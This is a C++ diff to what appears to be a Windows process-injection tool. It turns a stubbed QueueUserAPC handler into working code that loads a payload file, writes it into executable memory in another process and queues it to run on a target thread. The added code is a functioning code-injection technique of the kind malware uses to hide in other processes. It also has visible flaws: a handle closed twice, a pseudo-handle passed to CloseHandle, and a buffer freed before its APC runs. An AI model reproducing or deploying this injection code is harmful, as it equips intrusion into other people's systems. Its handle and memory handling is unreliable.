@@ -5,6 +5,7 @@
 
 #include <cstring>
 #include <string>
+#include <vector>
 dispatch_outcome handle_create_remote_thread(const rw_injection_request* req, const parsed_params&)
 {
     dispatch_outcome failure{};
@@ -150,21 +151,6 @@ dispatch_outcome handle_queue_user_apc(const rw_injection_request* req, const pa
         return failure;
     }
 
-    // Optional threadId must be positive if provided.
-    if (const auto thread_id = params.get_int("threadId"))
-    {
-        HANDLE thread = open_thread_for_injection(static_cast<DWORD>(*thread_id), failure);
-        if (!thread)
-        {
-            if (process != ::GetCurrentProcess())
-            {
-                ::CloseHandle(process);
-            }
-            return failure;
-        }
-        ::CloseHandle(thread);
-    }
-
     // Optional timeoutMs must be non-negative if provided.
     if (const auto timeout = params.get_int("timeoutMs"))
     {
@@ -178,11 +164,161 @@ dispatch_outcome handle_queue_user_apc(const rw_injection_request* req, const pa
         }
     }
 
+    DWORD target_thread_id = 0;
+    if (const auto thread_id = params.get_int("threadId"))
+    {
+        if (*thread_id <= 0)
+        {
+            if (process != ::GetCurrentProcess())
+            {
+                ::CloseHandle(process);
+            }
+            return { false, "TECHNIQUE_PARAM_INVALID", "threadId must be greater than zero." };
+        }
+        target_thread_id = static_cast<DWORD>(*thread_id);
+    }
+    else if (req && (req->target.kind == RW_TARGET_SELF || (req->target.kind == RW_TARGET_PROCESS_ID && req->target.pid == ::GetCurrentProcessId())))
+    {
+        target_thread_id = ::GetCurrentThreadId();
+    }
+    else
+    {
+        if (process != ::GetCurrentProcess())
+        {
+            ::CloseHandle(process);
+        }
+        return { false, "TECHNIQUE_PARAM_REQUIRED", "QueueUserAPC requires threadId for remote targets." };
+    }
+
+    HANDLE thread = nullptr;
+    bool close_thread = true;
+    if (target_thread_id == ::GetCurrentThreadId())
+    {
+        thread = ::GetCurrentThread();
+        close_thread = false; // pseudo-handle
+    }
+    else
+    {
+        thread = open_thread_for_injection(target_thread_id, failure);
+        if (!thread)
+        {
+            if (process != ::GetCurrentProcess())
+            {
+                ::CloseHandle(process);
+            }
+            return failure;
+        }
+    }
+
+    const char* payload_path = req ? req->payload_path : nullptr;
+    if (!payload_exists(payload_path))
+    {
+        ::CloseHandle(thread);
+        if (process != ::GetCurrentProcess())
+        {
+            ::CloseHandle(process);
+        }
+        return { false, "PAYLOAD_NOT_FOUND", "APC payload was not found." };
+    }
+
+    std::vector<unsigned char> payload;
+    if (!read_payload_file(payload_path, payload))
+    {
+        ::CloseHandle(thread);
+        if (process != ::GetCurrentProcess())
+        {
+            ::CloseHandle(process);
+        }
+        return { false, "PAYLOAD_READ_FAILED", "Failed to read APC payload." };
+    }
+
+    LPVOID remote_buffer = nullptr;
+    SIZE_T payload_size = payload.size();
+    if (process == ::GetCurrentProcess())
+    {
+        remote_buffer = ::VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    }
+    else
+    {
+        remote_buffer = ::VirtualAllocEx(process, nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    }
+
+    if (!remote_buffer)
+    {
+        ::CloseHandle(thread);
+        if (process != ::GetCurrentProcess())
+        {
+            ::CloseHandle(process);
+        }
+        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for APC payload." };
+    }
+
+    BOOL write_ok = FALSE;
+    if (process == ::GetCurrentProcess())
+    {
+        std::memcpy(remote_buffer, payload.data(), payload_size);
+        write_ok = TRUE;
+    }
+    else
+    {
+        write_ok = ::WriteProcessMemory(process, remote_buffer, payload.data(), payload_size, nullptr);
+    }
+
+    if (!write_ok)
+    {
+        if (process == ::GetCurrentProcess())
+        {
+            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
+        }
+        else
+        {
+            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
+            ::CloseHandle(process);
+        }
+        ::CloseHandle(thread);
+        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write APC payload." };
+    }
+
+    if (::QueueUserAPC(reinterpret_cast<PAPCFUNC>(remote_buffer), thread, 0) == 0)
+    {
+        if (process == ::GetCurrentProcess())
+        {
+            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
+        }
+        else
+        {
+            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
+            ::CloseHandle(process);
+        }
+        ::CloseHandle(thread);
+        if (close_thread)
+        {
+            ::CloseHandle(thread);
+        }
+        return { false, "APC_QUEUE_FAILED", "Failed to queue APC." };
+    }
+
+    if (req && req->target.kind == RW_TARGET_SELF && target_thread_id == ::GetCurrentThreadId())
+    {
+        ::SleepEx(0, TRUE);
+        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
+    }
+    else if (process == ::GetCurrentProcess())
+    {
+        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
+    }
+
+    if (close_thread)
+    {
+        ::CloseHandle(thread);
+    }
     if (process != ::GetCurrentProcess())
     {
+        // Leave remote memory allocated to avoid freeing before APC runs.
         ::CloseHandle(process);
     }
-    return { true, nullptr, nullptr }; // Stub: reachability only.
+
+    return { true, nullptr, nullptr };
 }
 
 dispatch_outcome handle_nt_create_thread_ex(const rw_injection_request* req, const parsed_params&)
